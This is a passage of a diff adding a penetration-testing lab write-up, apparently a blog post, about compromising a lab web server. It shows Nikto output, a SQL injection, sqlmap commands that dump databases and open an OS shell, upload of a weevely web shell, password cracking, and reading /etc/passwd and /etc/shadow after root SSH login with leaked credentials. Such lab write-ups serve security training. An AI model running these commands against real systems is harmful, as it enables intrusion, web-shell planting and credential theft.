+</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
+</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+</span><span class='line'>+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-3268: /includes/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3092: /includes/: This might be interesting...
+</span><span class='line'>+ OSVDB-3092: /info/: This might be interesting...
+</span><span class='line'>+ OSVDB-3092: /login/: This might be interesting...
+</span><span class='line'>+ OSVDB-3092: /register/: This might be interesting...
+</span><span class='line'>+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 12:48:10 2007
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+</span><span class='line'>+ /login.php: Admin login page/section found.
+</span><span class='line'>+ 7331 requests: 0 error(s) and 22 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2015-04-27 14:47:09 (GMT2) (10 seconds)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a SQL injection in email, we can see an error message trying to log in (filling an email field with the single quote):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://10.10.10.100/login.php:
+</span><span class='line'>
+</span><span class='line'>An error occurred in script '/var/www/login.php' on line 47: Query: SELECT *
+</span><span class='line'>FROM users WHERE email=''' AND pass='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'
+</span><span class='line'>AND active IS NULL 
+</span><span class='line'>
+</span><span class='line'>MySQL Error: You have an error in your SQL syntax; check the
+</span><span class='line'>manual that corresponds to your MySQL server version for the right syntax to
+</span><span class='line'>use near '86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' AND active IS NULL' at line 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using Sqlmap we dump the whole databases:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sqlmap -u "http://10.10.10.100/login.php" --forms --dump-all
+</span><span class='line'>[ .. snip .. ]
+</span><span class='line'>email=test@test.com&pass=123&submit=Login&submitted=TRUE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We try to crack hashes but without success in the reasonable time:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat mysql/user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > /tmp/hashes.csv
+</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# john --format=mysql-sha1 /tmp/hashes.csv 
+</span><span class='line'>[ .. snip .. ]
+</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat ch16/users.csv 
+</span><span class='line'>user_id,pass,email,active,last_name,first_name,user_level,registration_date
+</span><span class='line'>1,c2c4b4e51d9e23c02c15702c136c3e950ba9a4af,admin@isints.com,NULL,Privett,Dan,0,2011-05-07 17:27:01</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With OS Shell functionality of Sqlmap (&ndash;os-shell), we was able to obtain shell with the web user privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell> cat /etc/passwd
+</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] y
+</span><span class='line'>command standard output:
+</span><span class='line'>---
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
+</span><span class='line'>mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
+</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
+</span><span class='line'>dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, MySQL daemon is running as root (=uid 0), this is also the
+reason, why we were able to write something with database user to /var/www
+(owned by www-data), that&rsquo;s not common.</p>
+
+<p>We can also upload weevely to the remote system and use it as the more sophisticated shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://10.10.10.100/login.php" --data "email=test@test.com&pass=123&submit=Login&submitted=TRUE" --file-write="/var/www/weevely.php.txt" --file-dest=/var/www/w.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found the database credentials, however they didn&rsquo;t work:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">web</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nb">mysqli_connect</span><span class="o">.</span><span class="nx">php</span>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="c1"># Script 8.2 - mysqli_connect.php</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// This file contains the database access information.</span>
+</span><span class='line'><span class="c1">// This file also establishes a connection to MySQL</span>
+</span><span class='line'><span class="c1">// and selects the database.</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Set the database access information as constants:</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;goodday&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;ch16&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Make the connection:</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$dbc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysqli_connect</span> <span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">OR</span> <span class="k">die</span> <span class="p">(</span><span class="s1">&#39;Could not connect to MySQL: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That was strange, because the web application is connected. After a little more digging, we found this suspicious file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">web</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="o">../</span><span class="nb">mysqli_connect</span><span class="o">.</span><span class="nx">php</span>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="c1"># Script 8.2 - mysqli_connect.php</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// This file contains the database access information.</span>
+</span><span class='line'><span class="c1">// This file also establishes a connection to MySQL</span>
+</span><span class='line'><span class="c1">// and selects the database.</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Set the database access information as constants:</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;root@ISIntS&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="p">,</span> <span class="s1">&#39;ch16&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Make the connection:</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$dbc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysqli_connect</span> <span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">OR</span> <span class="k">die</span> <span class="p">(</span><span class="s1">&#39;Could not connect to MySQL: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <a href="http://10.10.10.100/blog/index.php">blog application</a> uses the text files instead of MySQL. We were only
+able to locate the password file, without cracking it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@web:/var/www $ cat blog/config/password.txt
+</span><span class='line'>$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using root / root@ISIntS we can finally log in via ssh as root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@web:~# cat /etc/shadow 
+</span><span class='line'>root:$6$aO1TGdyc$XfiMyap/.QYhjIip5xxrgpO1ydlo.DQXns3fYYLt1hiH4Fp0PJP4TMoDSg3wpAFklF03dV2cUDL04YcR9bSSI/:15101:0:99999:7:::
+</span><span class='line'>daemon:*:15101:0:99999:7:::
+</span><span class='line'>bin:*:15101:0:99999:7:::
+</span><span class='line'>sys:*:15101:0:99999:7:::
+</span><span class='line'>sync:*:15101:0:99999:7:::
+</span><span class='line'>games:*:15101:0:99999:7:::
+</span><span class='line'>man:*:15101:0:99999:7:::
+</span><span class='line'>lp:*:15101:0:99999:7:::
+</span><span class='line'>mail:*:15101:0:99999:7:::
+</span><span class='line'>news:*:15101:0:99999:7:::
+</span><span class='line'>uucp:*:15101:0:99999:7:::
+</span><span class='line'>proxy:*:15101:0:99999:7:::
+</span><span class='line'>www-data:*:15101:0:99999:7:::
+</span><span class='line'>backup:*:15101:0:99999:7:::
+</span><span class='line'>list:*:15101:0:99999:7:::
+</span><span class='line'>irc:*:15101:0:99999:7:::
+</span><span class='line'>gnats:*:15101:0:99999:7:::
+</span><span class='line'>nobody:*:15101:0:99999:7:::
+</span><span class='line'>libuuid:!:15101:0:99999:7:::
+</span><span class='line'>syslog:*:15101:0:99999:7:::
+</span><span class='line'>mysql:!:15101:0:99999:7:::
+</span><span class='line'>sshd:*:15101:0:99999:7:::
+</span><span class='line'>landscape:*:15101:0:99999:7:::
+</span><span class='line'>dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
